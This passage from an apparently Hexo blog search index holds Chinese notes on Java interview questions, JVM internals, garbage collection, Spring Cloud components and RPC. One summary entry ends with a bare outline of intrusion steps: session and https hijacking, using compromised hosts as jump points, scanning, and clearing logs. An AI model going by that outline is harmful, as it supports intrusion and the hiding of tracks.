    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-13%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021（1）自我介绍，做过什么项目。（2）java虚拟机的区域如何划分，每一个区的动能，这一块自由发挥。（3）双亲委派模型中，从顶层到底层，都是哪些类加载器，分别加载哪些类？（4）有没有可能父类加载器和子类加载器，加载同一个类？如果加载同一个类，该使用哪一个类？（5）HashMap的结构，get()，put()是如何实现的？HashMap有哪些问题？（6）ConcurrentHashMap的get()，put()，又是如何实现的？ConcurrentHashMap有哪些问题？ ConcurrentHashMap的锁是读锁还是写锁？（7） HashMap与HashTable的区别（8）sleep()和wait()分别是哪个类的方法，有什么区别？synchronized底层如何实现的？用在代码块和方法上有什么区别？（9）什么是线程池？如果让你设计一个动态大小的线程池，如何设计，应该有哪些方法？（10）什么是死锁？JVM线程死锁，你该如何判断是因为什么？如果用VisualVM，dump线程信息出来，会有哪些信息？这一块问的很多....问的我懵了. 因为并没有实际操作过 = =（11）查看jvm虚拟机里面堆、线程的信息，你用过什么命令？我只用过图形界面VisualVM。。。（12）垃圾回收算法有哪些？CMS知道吗？如何工作的？（13）数据库中什么是事务？事务的隔离级别？事务的四个特性？什么是脏读，幻读，不可重复读？（14）数据库索引的结构有哪些？我说B树和B+树，他说只有这两个吗。我又说全文倒排索引。然后介绍B+树的结构。（15）数据库中的分页查询语句怎么写？（16）什么是一致性哈希？用来解决什么问题？（17）Redis的存储结构，或者说如何工作的，与mysql的区别？有哪些数据类型？（18）项目中用到redis，为什么选用redis，了解其他NoSQL数据库吗？在你的项目中是如何运用redis的？key是什么，value是什么？（19）归并排序的过程？时间复杂度？空间复杂度？（20）你平常用什么排序？快速排序。说说在那些场景下适用，哪些场景下不适用。（21）你在项目中做什么？因为我用到Solr，他就问我Solr是如何工作的？ {———-}12345678910111213141516171819202122232425262728293031323334353637383940（1）自我介绍。（2）JVM如何加载一个类的过程，双亲委派模型中有哪些方法？（3）HashMap如何实现的？（4）HashMap和Concurrent HashMap区别， Concurrent HashMap 线程安全吗， Concurrent HashMap如何保证 线程安全？（5）HashMap和HashTable 区别，HashTable线程安全吗？（6）进程间通信有哪几种方式？（7）JVM分为哪些区，每一个区干吗的？（8）JVM如何GC，新生代，老年代，持久代，都存储哪些东西？（9）GC用的引用可达性分析算法中，哪些对象可作为GC Roots对象？（10）快速排序，过程，复杂度？（11）什么是二叉平衡树，如何插入节点，删除节点，说出关键步骤。（12）TCP如何保证可靠传输？三次握手过程？（13）TCP和UDP区别？（14）滑动窗口算法？（15）Linux下如何进行进程调度的？（16）Linux下你常用的命令有哪些？（17）操作系统什么情况下会死锁？（18）常用的hash算法有哪些？（19）什么是一致性哈希？（20）如何理解分布式锁？（21）数据库中的范式有哪些？（22）数据库中的索引的结构？什么情况下适合建索引？（23）Java中的NIO，BIO，AIO分别是什么？（24）用什么工具调试程序？JConsole，用过吗？（25）现在JVM中有一个线程挂起了，如何用工具查出原因？（26）线程同步与阻塞的关系？同步一定阻塞吗？阻塞一定同步吗？（27）同步和异步有什么区别？（28）线程池用过吗？（29）如何创建单例模式？说了双重检查，他说不是线程安全的。如何高效的创建一个线程安全的单例？（30）concurrent包下面，都用过什么？（31）常用的数据库有哪些？redis用过吗？（32）了解hadoop吗？说说hadoop的组件有哪些？hdfs，hive,hbase,zookeeper。说下mapreduce编程模型。（33）你知道的开源协议有哪些？（34）你知道的开源软件有哪些？（35）你最近在看的书有哪些？（36）你有什么问题要问我吗？（37）了解哪些设计模式？说说都用过哪些设计模式（38）如何判断一个单链表是否有环？（39）操作系统如何进行分页调度？（40）匿名内部类是什么？如何访问在其外面定义的变量？ 123456HashMap和Hashtable的区别实现一个保证迭代顺序的HashMap说一说排序算法，稳定性，复杂度说一说GC可以保证的实习时长职业规划]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[类加载过程]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-classloader%2F</url>
    <content type="text"><![CDATA[类加载过程 加载–》验证–》准备—》解析—》初始化—》使用—-》卸载 其中 在准备阶段完成 成员变量初始值赋值 0 、 0.0之类 加载 1、将java字节码以二进制的方式读入到jvm内存中，然后将二进制数据流按照字节码规范解析成jvm内部的运行时数据结构2、对外暴露加载结构 更广泛的加载类 (1) 从本地文件系统中读取 (2) 从网络上加载（典型应用：java Applet） (3) 从jar，zip，war等压缩文件中加载 (4) 通过动态将java源文件动态编译产生（jsp的动态编译） (5) 通过程序直接生成。 验证 1、文件格式验证（这一步会与装载阶段交叉进行），元数据验证，字节码验证，符号引用验证（这个阶段的验证往往会与解析阶段交叉进行）。 准备 int,byte,char,long,float,double 默认初始值为0 boolean 为false（在jvm内部用int表示boolean，因此初始值为0） reference类型为null 对于final static基本类型或者String类型，则直接采用常量值（这实际上是在编译阶段就已经处理好了）。 解析 1、类的常量池中的类，字段，方法，接口的符号引用，将他们替换成直接引用的过程 CONSTANT_Class_info CONSTANT_Fieldref_info CONSTANT_Methodref_info CONSTANT_InterfaceMethodref_info 初始化 1、根据用户程序中的初始化语句为类的静态变量赋予正确的初始值 2、执行时机 (1) 通过new关键字实例化对象、读取或设置类的静态变量、调用类的静态方法(对应new,getstatic,putstatic,invokespecial这四条字节码指令）。 (2) 通过反射方式执行以上行为时。 (3) 初始化子类的时候，会触发父类的初始化。 (4) 作为程序入口直接运行时的主类。 类加载器类加载器：启动类加载器、扩展类加载器、应用类加载器、自定义加载器 自定义加载器：比如tomcat：CommonClassloader—CatalinaClassLoader、ShareClassLoader、WebappClassLoader、JspClassLoader 双亲委派模型 1、当一个类触发init方法进行初始化、先判断是否已经加载、没有的话交由父类classloader进行初始化、父类不存在使用启动类加载器初始化、父类的加载器加载失败则使用自己的classloader加载启动]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ribbon]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fribbon%2F</url>
    <content type="text"><![CDATA[官方wiki地址：https://github.com/Netflix/ribbon/wiki 功能简介： 1、多重和可插入的负载平衡 2、与eureka服务整合 3、内置故障发现能力 4、云启用 5、与负载均衡器集成客户端 6、Archaius配置驱动客户端工厂 三个子项目： ribbon-core：包括负载均衡器和客户端接口定义、通用负载均衡器实现、客户端与负载均衡器和客户端工厂集成 ribbon-eureka：包含基于Eureka客户端的负载均衡器实现、这是用于服务注册和发现的liberary ribbon-httpclient：包含基于JSR-311的Rest客户端与服务均衡器集成的实现 {———-} 配置 sample-client.properties1234567891011121314151617181920# Max number of retries on the same server (excluding the first try)sample-client.ribbon.MaxAutoRetries=1# Max number of next servers to retry (excluding the first server)sample-client.ribbon.MaxAutoRetriesNextServer=1# Whether all operations can be retried for this clientsample-client.ribbon.OkToRetryOnAllOperations=true# Interval to refresh the server list from the sourcesample-client.ribbon.ServerListRefreshInterval=2000# Connect timeout used by Apache HttpClientsample-client.ribbon.ConnectTimeout=3000# Read timeout used by Apache HttpClientsample-client.ribbon.ReadTimeout=3000# Initial list of servers, can be changed via Archaius dynamic property at runtimesample-client.ribbon.listOfServers=www.microsoft.com:80,www.yahoo.com:80,www.google.com:80]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Reactor Core]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Freactor-core%2F</url>
    <content type="text"><![CDATA[本文从以下介绍下 Reactor （反应堆）12345首先简单介绍Reactor 是什么东西、其次解决什么问题、领域应用、原理、优点和缺点、 1、简介 2、解决问题 3、领域应用举个比较熟悉的例子 dubbodubbo底层使用了netty线程模型 netty 中使用了reactor模式 {———-} 那么什么是reactor模式？ Reactor三种模型 Netty线程模型 Netty结构 dubbo中使用的netty 4、Reactor 原理介绍4.1 Reactor模式结构 4.2Reactor模式模块之间的交互 5、 Reactor优点Reactor An Object Behavioral Pattern for Demultiplexing and Dispatching Handles for Synchronous Events解耦、提升复用性、模块化、可移植性、事件驱动、细力度的并发控制等。相比 传统的实现、即线程的切换、同步、数据的移动会引起性能问题。也就是说从性能的角度上，它最大的提升就是减少了性能的使用，即不需要每个Client对应一个线程 关于 减少使用线程使用 对性能提升的影响 可看这篇论文 SEDA: Staged Event-Driven Architecture - An Architecture for Well-Conditioned, Scalable Internet Service 对随着线程的增长带来性能降低做了一个统计： 在这个统计中，每个线程从磁盘中读8KB数据，每个线程读同一个文件，因而数据本身是缓存在操作系统内部的，即减少IO的影响；所有线程是事先分配的，不会有线程启动的影响；所有任务在测试内部产生，因而不会有网络的影响。该统计数据运行环境：Linux 2.2.14，2GB内存，4-way 500MHz Pentium III。从图中可以看出，随着线程的增长，吞吐量在线程数为8个左右的时候开始线性下降，并且到64个以后而迅速下降，其相应事件也在线程达到256个后指数上升。即1+1&lt;2，因为线程切换、同步、数据移动会有性能损失，线程数增加到一定数量时，这种性能影响效果会更加明显。 6.Reactor模式的缺点]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存回收]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-memory-recovery%2F</url>
    <content type="text"><![CDATA[回收区域：堆【主要区域】、方法区【回收废弃常量、无用类】 无用类定义：1、jvm中不存在该实例2、加载该类classLoader已被回收3、任何地方都不存在引用 回收算法：1、标记清除2、标记整理3、复制4、分代收集 回收器：单线程1、serial2、serial old多线程1、parNew2、parallel scavenge3、parallel old4、cms5、G1 {———-} 回收新生代serial、parNew、parallel scavenge 回收老年代cms、serial old、parallel old 分代收集 G1 serial最老、也是默认回收算法、单线程缺点：暂定所有用户进程来回收垃圾、每一小时有五分钟不能给用户提供服务优点: 简单高效适合场景、clent模式 ParNewserial多线程版本场景：参考serial 多核处理器 Parallel scavenge1、复制算法2、目标、回收达到一个可控的吞吐量【吞吐量=运行代码时间/（运行代码时间+GC时间）】3、吞吐量优先收集器 serial old1、单线程、标记整理算法2、serial 老版本3、jdk1.5之前配合Parallel scavenge、cms后备预案 parallel old1、Parallel scavenge老版本2、标记整理算法3、注重吞吐量以及CPU资源敏感场景、使用Parallel scavenge ++ parallel old4、吞吐量优先 CMS1、标记清除2、目标：最短回收停顿时间3、四个步骤：初始标记、并发标记、重新标记、并发清除 G11、1.7HotSpot重要进化特征2、优点：并行并发、分代收集、空间整合【标记整理】、可预测停顿3、四个步骤：初始标记、并发标记、最终标记、筛选回收 对象回收算法：引用计数法、引用不可达算法、]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring cloud 总 架构图]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-cloud-1%2F</url>
    <content type="text"><![CDATA[版权所有 转载 请表明出处 相关代码地址 {———-} 纠正： 12cli 是 结合grovy脚本 工程consul 是服务注册中心 不过可以结合docker做更容易扩散的集群中心 1234567891011121314151617总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新有RPC 框架的 注册 netflix有 关于配置的 远程仓库配置 config有 关于消息 bus stream有关于app的 for android (提供RestTemplate)有关任务调度 的 task有关于 shell 编程有关于安全方面的有关于系统拦截 zuul等等。那么看名字可以分为两种1、Spring * --- spring 为了完善&quot;应用&quot;增加的功能机制 例如 spring security 、spring vault、等等2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&quot;微服务系统&quot;更方便的集成 对各个功能模块进行封装的结果、]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring cloud 族谱]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-cloud-2%2F</url>
    <content type="text"><![CDATA[功能简介来自官网整理人：上善若水 {———-} 12345678910111213141516总结下 ： 可以说 spring cloud 服务中 包括各种spring 基础服务也有了很多更新有RPC 框架的 注册 netflix有 关于配置的 远程仓库配置 config有 关于消息 bus stream有关于app的 for android (提供RestTemplate)有关任务调度 的 task有关于 shell 编程有关于安全方面的有关于系统拦截 zuul等等。那么看名字可以分为两种1、Spring * --- spring 为了完善&quot;应用&quot;增加的功能机制 例如 spring security 、spring vault、等等2、Spring Cloud * ---spring cloud * 是在 微服务中 为了&quot;微服务系统&quot;更方便的集成 对各个功能模块进行封装的结果、]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存一条线路]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-total%2F</url>
    <content type="text"><![CDATA[入手从collection开始12345678910111213141516171819202122232425262728293031集合常用 arrayList 底层数据结构 object[] 数组特点 内存连续 数据挨个存放 那么删除中间一个时候 后面的数据会挨个往前挪移 因为地址可知 查询节点数据 较快 通过下标获取应对业务场景 插入后查询修改数据 如果执行删除操作会造成资源浪费 需要时间重新规划数组结构linkedList 底层数据结构链表链表特点 内存不连续 代码 node first、 last； object；存放前后节点hash值【待查询】 然后跟节点对象 该链表实现 Deque 接口，为 add、poll 提供先进先出队列操作，以及其他堆栈和双端队列操作。应对业务场景 插入后 可能会删除某项数据 以作数据调整&#123;----------&#125;hashMap内存结构是hash散列 【我理解为 散着放的列表】 内存特点 hash值分桶存储【其实就一一小块内存】 当hash值冲突 会在该桶内维护一个链表警告：暂时不晓得这个桶有多大 所以尽量避免hash冲突 万一桶满了是不是要重新规划内存 造成资源浪费？linkedHashMap 内存特点 与hashMap一致不同点 linkedHashMap 额外维护了一个双重链表来记录数据插入的顺序性那么相比较hashMap 多了一个链表要维护 性能要有所下降 【业务需要 没办法】treeMap内存结构 红黑二叉树内存特点：位置 对于二叉树还没搞明白 只晓得父红子黑【还不知道对不对】 说到数据内存 就要讲讲内存结构 12345678910111213141516jvm内存分为五大块【程序计数器、虚拟机栈、本地方法栈、方法区、堆】从线程是否共享分起： 线程共享：堆、方法区/非线程共享：程序计数器、虚拟机栈、本地方法栈简单说下存储信息1、程序计数器 用于存放下一条指令所在单元的地址的地方 【c与java的交界点用以存放执行指针】2、虚拟机栈 【为java方法提供服务】3、本地方法栈【为jvm提供使用native方法服务】4、方法区 【存储类常量、静态变量等信息】5、堆 【存放对象实例、对象成员变量】对于一个obj：类引用--stack中类成员变量--Heap中【回收主要地方】类静态变量、常量--Method Area中类方法--以帧栈形式保存到栈中 那么内存存储规划完 就得看看 内存的回收机制12345随便一查 就能查到 四种算法：标记清除、标记整理、复制、分代收集那么实现这些算法的回收器：仔细查查有六种 ：Serial收集器【串行】、parNew收集器【并行】、Parallel Scavenge收集器 【并行】Serial Old收集器 【串行】、Parallel Old 收集器 【并行】、cms收集器 差不多 回收完成 然后就是 jvm的执行优化1优化方向 对回收进行控制【减小回收频率】 设定堆栈大小、新生代老年代大小等等、很多很多 那么总结完成之后这一条内存线路就算差不多了 算一条知识线路 貌似还没有 创建….[尴尬笑]]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring Roo]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fspring-roo%2F</url>
    <content type="text"><![CDATA[what？ 使用命令行形式构建项目 下载地址：https://projects.spring.io/spring-roo/#running-from-shell {———-} 快速搭建：12345678910111213141516mkdir hellocd helloroo.shroo&gt; project setup --topLevelPackage com.fooroo&gt; jpa setup --provider HIBERNATE --database HYPERSONIC_IN_MEMORYroo&gt; entity jpa --class ~.domain.Timerroo&gt; field string --fieldName message --notNullroo&gt; repository jpa --allroo&gt; service --allroo&gt; web mvc setuproo&gt; web mvc view setup --type THYMELEAFroo&gt; web mvc controller --all --responseType THYMELEAFroo&gt; web mvc controller --all --pathPrefix /apiroo&gt; quitmvn spring-boot:run]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jvm内存结构]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjvm-memory-structure%2F</url>
    <content type="text"><![CDATA[jvm内存 一条线线程共享 线程不共线【也叫非线程共享】 线程共享： 堆【Heap】、 方法区【method area】非线程共享： 程序计数器、虚拟机栈、本地方法栈 方法区还包含 运行时常量池【类常量数据】 {———-} 12345异常：jvm中定义两种异常 StackOverflow、outofmemory一种是栈溢出 一种是内存溢出官方定义栈溢出：线程请求深度大于虚拟机允许深度、抛出StackOverflow官方定义内存溢出：java内存扩展、当虚拟机申请不到足够的内存、抛出outofmemory jvm堆细分：新生代、老年代【分代收集算法】再细分：Eden、From Survivor、To Survivor空间再内存分配黑可以分出多个线程私有的分配缓冲区存放内容：对象实例、细致的划分只是为了更好的回收堆是回收主要区域 edgn区域 首次存放数据 内存不够会触发 MinorGC 针对老年代 还有MajorGC、Full GC、其中 FUll GC较慢 量级：10倍 jvm方法区1、线程共享2、存储已被虚拟机加载、类信息、常量、静态变量、即时编译器编译后的代码数据 jvm运行时常量池1、方法区一部分2、存放编译期生成各种字面量和符号引用、 直接内存1、不属于jvm运行时数据取一部分 再五大板块外、2、jdk1.4中 引入NIO、引用了一种基于通道（channel）与缓冲区（Buffer）的IO方式、它可以使用Native函数库直接分配对外内存、然后通过一个存储再java堆中的DirectByteBuffer对象来作为这一块内存引用、来进行操作、避免了java堆和native堆中来回复制数据3、该内存受限于 操作系统和物理内存 虚拟机栈1、虚拟机执行java程序使用栈 本地方法栈1、执行native方法使用栈 程序计数器1、与c交界点、一个线程一个程序计数器、内存耗费较小、记录执行指针]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jvm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zuul]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Fzuul%2F</url>
    <content type="text"><![CDATA[zuul 是架设在整个springcloud微服务服务网中的门户模块所有的外界访问请求 都要经过 这个模块zuul结合eureka 可以做到动态服务代理 实现功能： 1、身份验证和安全性-识别每个资源的身份验证要求并拒绝不满足的要求 2、洞察和检测-在边缘跟踪有意义的数据和统计数据、以便为我们提供准确的生产视图 3、动态路由-根据需要将请求动态路由到不同的后端集群 4、压力测试-逐渐增加到群集的流量，以衡量表现 5、加载Shedding-为每种类型的请求分配容量，并删除超出限制的请求 6、静态响应处理-直接边缘建立响应、而不是将他们转发到内部群集 7、多区域弹性-跨AWS区域的路由请求、以使我们的ELB使用多样化、并使我们的边缘更接近我们的成员 {———-} 12345组件包含：zuul-core ：包含编译和执行过滤器的核心功能的库zuul-simple-webapp ：它显示了如何用zuul-core 构建一个应用程序的简单例子zuul-netflix ： 将其他NetflixOSS组件添加到Zuul的库 使用功能区来执行路由请求zuul-netflix-webapp ：webapp 把zuul-core 和 zuul-netflix 组合成一个 易于使用的软件包 官方架构]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPC]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Frpc%2F</url>
    <content type="text"><![CDATA[RPC（Remote Procedure Call）—远程过程调用 工作原理 1.调用客户端句柄；执行传送参数 2.调用本地系统内核发送网络消息 3.消息传送到远程主机 4.服务器句柄得到消息并取得参数 5.执行远程过程 6.执行的过程将结果返回服务器句柄 7.服务器句柄返回结果，调用远程系统内核 8.消息传回本地主机 9.客户句柄由内核接收消息 10.客户接收句柄返回的数据 {———-} 协议结构123456789101112131415161718192021222324252627远程过程调用（RPC）信息协议由两个不同结构组成：调用信息和答复信息。信息流程如下所示：RPC：远程过程调用流程RPC 调用信息：每条远程过程调用信息包括以下无符号整数字段，以独立识别远程过程：程序号（Program number）程序版本号（Program version number）过程号（Procedure number）RPC 调用信息主体形式如下：struct call_body &#123;unsigned int rpcvers;unsigned int prog;unsigned int vers;unsigned int proc;opaque_auth cred;opaque_auth verf;1 parameter2 parameter . . . &#125;；RPC 答复信息：RPC 协议的答复信息的改变取决于网络服务器对调用信息是接收还是拒绝。答复信息请求包括区别以下情形的各种信息：RPC 成功执行调用信息。.RPC 的远程实现不是协议第二版，返回 RPC 支持的最低和最高版本号。在远程系统中，远程程序不可用。远程程序不支持被请求的版本号。返回远程程序所支持的最低和最高版本号。请求的过程号不存在。通常是呼叫方协议或程序差错。RPC答复信息形式如下：enum reply_stat stat&#123;MSG_ACCEPTED = 0,MSG_DENIED = 1 &#125;;]]></content>
      <categories>
        <category>java</category>
        <category>agreement</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[容器已经关闭]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Fexception-1%2F</url>
    <content type="text"><![CDATA[spring cloud task 启动报错 context has been closed already 解决办法 12345671.5.2 版本ok2.0.0 报错容器已关闭解决办法#spring.cloud.task.closecontext_enabled=false {———-} spring cloud Ribbon 解决办法 写到启动类就行 1234567891011121314spring boot &lt;= 1.3无需定义spring boot &gt;= 1.4springboot不在维护 需要自己定义RestTempalte@Beanpublic RestTemplate restTemplate (RestTemplateBuilder builder)&#123; //Do any additional configuration here return builder.build();&#125;]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cloud feign灵异事件]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Ffeign-exception-1%2F</url>
    <content type="text"><![CDATA[12报错 ：Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;dataSourceInitializerPostProcessor&apos;: Unsatisfied dependency expressed through field &apos;beanFactory&apos;; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name &apos;com.****.feign.UserCenterFeignService&apos;: Lookup method resolution failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.feign.FeignClientFactoryBean] from ClassLoader [sun.misc.Launcher$AppClassLoader@61e4705b] 解决办法 加入依赖 1234原因未明 、创建项目时候导入了feign使用@EnableFeignClients注解 也ok 不报错 我就以为 feign包导入了 结果不知道哪来的包来的这个注解 导致 灵异事件` {———-} 1234严重怀疑是这个包里的mmp 莫名其妙的好了 仿佛又回到从前你对java 一无所知......]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sleuth灵异事件]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud-exception%2Fsleuth-exception-1%2F</url>
    <content type="text"><![CDATA[分布式 服务跟踪系统 客户端发送ok server端 启动ok但是就是没有数据 {———-} 12345678灵异原因：可能是版本不一致要保证 客户端 cloud version和sleuth server cloud version 版本一致修改方式：`]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术发展]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-0%2F</url>
    <content type="text"><![CDATA[从qq的点对点通信到微博的多人群聊话题到电商 人类进化就有的课题–交易交易的大量订单促使了–数据分析数据分析的性能要求–出现了云计算云计算的产生又引发了–人工智能【人工智能就是根据数据分析做出一个合理的判断、大概模式就是 从一个大的数据库里寻找最合理的返回答案】 那么下一个阶段是什么？]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个HTTP请求究竟发生了什么]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-1%2F</url>
    <content type="text"><![CDATA[这个问题 去年 分析过一次 1、首先 请求从浏览器出发2、到达 服务器 nginx3、nginx分发给 各个服务容器 tomcat4、tomcat 把请求发给 服务系统5、服务 接收请求 由前端控制器 struts 或者 springmvc 接收6、进行业务控制 service7、获取业务数据 dao层 查询db 并返回 数据8、数据 反向 dao —-service—controller9、最后由springmvc 返回 不经历nginx 返回到浏览器 {———-} 那么今年 结合新了解的 服务 更新这个列表 首先建立连接 【tcp ip 协议 】1、三次握手 【过程】2、经过的信息 源地址 ip 发送 一个请求连接包 到 目标地址3、目标服务器 接收到信息 返回数据包 表明连接成功 可以继续发送请求 请求建立后 发送 https请求服务服务会先到 目标地址的linux服务器linux 先到网卡网卡把请求 发给 linux端口服务如果还有LVS负载均衡服务等服务、会把请求发送给负载服务器如果没有LVS服务器 那么服务进入nginx等应用层负载均衡服务nginx服务分发给各个端口 端口内是真是服务的地址 如果有docker容器 要进入docker容器 进入docker容器 再进入服务实例服务实例 有springmvc 接收请求调用service服务【会有服务调用】服务调用有RPC框架【dubbo或者 eureka等等】service 调用dao 【这里还有java 底层】 从service说吧服务进入service那么要在虚拟机开辟一块新内存 用户内容存储和业务执行开辟方法 是调用的Cc指针开辟空间 把业务逻辑代码 转为 二进制数据 然后cpu 执行【关于CPU】学过计算机或者单片机的应该都了解cpu 单片机 也是个简单的cpu 只能执行一些较为简单的逻辑控制 一般cpu不都讲由多少多少亿个晶体管构成吗 、其实蛮复杂的、一个个数起来都得好几年吧、何况是按一定的方法方式排列到一起 能够执行起来 跑偏了在dubbo或者eureka中还会有netty nio aio bio问题由于了解不全面 这块就不写了 还有数据库，并发访问量，事务，存储过程。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[技术负责人应有的几项要求]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-2%2F</url>
    <content type="text"><![CDATA[1、把控进度2、把控风险3、任务分发【开发量分配】4、需求分析、需求拆解【功能可实现性功能实现周期预估】、需求合理性判断5、技术过关【架构、细节、各个组件的选型】]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里证书]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-100%2F</url>
    <content type="text"><![CDATA[阿里编码规范 阿里API服务调用 {———-} 阿里网站部署 阿里mysql]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>阿里证书</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[总结]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-3%2F</url>
    <content type="text"><![CDATA[梳理一下脑子里的东西按点整理一下 消息中间件，ActiveMQ.Kafka.ZeroMQ.RabbitMQ.RocketMQ 服务治理Dubbo.eureka. 服务网springcloud cpu线程 docker容器 负载均衡lvs radware nginx keepalived 端口转发，网卡驱动 jvm内存 . 堆.栈 规则 一个线程会占用掉多少内存.一个对象会占用多少内存 {———-} javac 编译后文件 字节码文件 数据库mysql.alisql.oracle (并发.事物.存储过程) Nosql.redis.memcached.ecache.mongdb 算法、负载均衡算法，缓存淘汰算法，排序算法，数据整理算法 uml设计.部署图，流程图，ER图，时序图。 搜索引擎 权限架构 IO:AIO BIO NIO 消息流 Netty 怎么讲呢 今年大脑经历了大量信息的冲击.有些东西可能会很快忘记.留下的只有感悟.经验 123456789101112131415161718192021222324总结.构建知识体系.分流:负载均衡(软硬件).算法(随机.权重.最小调用).软件:nginx.vortex.radware硬件:LVS.F5缓存: Redis. Memcached. Mongdb. ehcache问题:缓存击穿.缓存同步并发.线程.数据库:mysql.AliSQL容量.并发线程.事物提交.存储过程java基本功.io.util.sql.主流中间件:RPC:dubbo. eureka消息中间件rocketmq.rabbitmq.zeromq.技术架构:springcloud服务架构:SOA 1234567891011121314渗透:1.基本工具使用比如wifi劫持.https劫持.session劫持.1.5.网站探测:whois.钟馗之眼.2.跳点搭建.vpn.或者直接控制肉鸡进行跳点3.主机扫描.漏洞扫描.关注国家网络安全网发布的漏洞.4.脚本攻击.shell脚本 python脚本5.日志清除. 今日起 关注人工智能、进军人工智能。以备将来使用。]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高并发]]></title>
    <url>%2F2018%2F03%2F24%2Ftechnical-summary%2Ftechnical-summary-4%2F</url>
    <content type="text"><![CDATA[分布式，服务SOA，集群 建个好的表结构，降低业余逻辑代码量，因为多一行代码，多一份危险，简单到极致的增删改最最能抗住高并发的 {———-} 申明:spring cloud 1.0 就经过了千万级别用户洗礼才发布的]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>技术总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS负载均衡]]></title>
    <url>%2F2018%2F03%2F24%2Fload-balance%2Fdns%2F</url>
